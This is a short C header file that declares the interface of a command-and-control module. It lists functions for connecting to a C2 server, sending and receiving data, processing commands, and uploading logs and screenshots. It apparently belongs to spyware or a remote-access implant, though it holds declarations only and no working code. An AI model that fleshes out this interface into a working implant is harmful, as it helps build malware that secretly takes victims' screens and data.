#ifndef C2_COMMUNICATION_FIXED_H
#define C2_COMMUNICATION_FIXED_H

// C2 communication functions
void init_c2_communication();
int connect_to_c2();
int send_data_to_c2(const char* data, size_t length);
int receive_data_from_c2(char* buffer, size_t buffer_size);
void close_c2_communication();
void* c2_communication_main(void* arg);
void process_c2_command(const char* command);
void upload_logs();
void upload_screenshots();

#endif // C2_COMMUNICATION_FIXED_H